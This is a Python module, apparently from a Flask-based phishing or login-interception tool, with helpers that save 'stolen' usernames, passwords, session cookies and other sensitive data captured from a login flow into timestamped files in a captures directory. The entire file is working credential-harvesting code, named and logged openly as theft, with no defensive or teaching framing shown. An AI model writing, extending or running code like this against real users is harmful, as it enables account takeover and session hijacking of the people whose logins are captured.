from pathlib import Path
from re import sub
from datetime import datetime, timezone
from json import dumps
from flask import current_app
from ..flow import LoginFlow

def get_captures_dir() -> Path:
    """Returns the path to the captures directory"""
    return Path(current_app.root_path).parent / "captures"

def make_captures_dir() -> None:
    """Creates the captures directory if it doesn't exist"""
    get_captures_dir().mkdir(exist_ok=True)

def get_file_name(suffix: str, utc_now: datetime) -> str:
    """Returns a safe file name for the given username and suffix"""
    utc_now_formatted = utc_now.strftime('%Y%m%dT%H%M%S')
    return f"{utc_now_formatted}_{suffix}.txt"

def save_stolen_credentials(username: str, password: str) -> None:
    """Saves the stolen credentials to a text file in the captures directory"""
    try:
        make_captures_dir()

        utc_now = datetime.now(timezone.utc)

        file = get_captures_dir() / get_file_name("credentials", utc_now)

        content = (
            f"Data acquired at: {utc_now} (UTC)\n"
            f"Username: {username}\n"
            f"Password: {password}\n"
        )

        file.write_text(content, encoding="utf-8")

        current_app.logger.info(f"Stolen credentials saved to {file.resolve()}")

    except Exception:
        current_app.logger.exception(f"Failed to save stolen credentials")

def save_stolen_data(login_flow: LoginFlow) -> None:
    """Saves the stolen data to a text file in the captures directory"""
    try:
        make_captures_dir()

        utc_now = datetime.now(timezone.utc)

        username = login_flow.username or ""
        password = login_flow.password or ""
        cookies = [
            {
                "name": cookie.name,
                "value": cookie.value,
                "domain": cookie.domain,
                "path": cookie.path,
                "secure": cookie.secure,
                "expires": cookie.expires,
                "http_only": cookie.has_nonstandard_attr("HttpOnly")
            }
            for cookie in login_flow.session.cookies or []
        ]
        sensitive_data = login_flow.sensitive_data or {}

        file = get_captures_dir() / get_file_name("data", utc_now)

        content = (
            f"Data acquired at: {utc_now} (UTC)\n"
            f"Username: {username}\n"
            f"Password: {password}\n"
            f"Cookies: {dumps(cookies, indent=4)}\n"
            f"Sensitive Data: {dumps(sensitive_data, indent=4)}\n"
        )

        file.write_text(content, encoding="utf-8")

        current_app.logger.info(f"Stolen data saved to {file.resolve()}")

    except Exception:
        current_app.logger.exception(f"Failed to save stolen data")
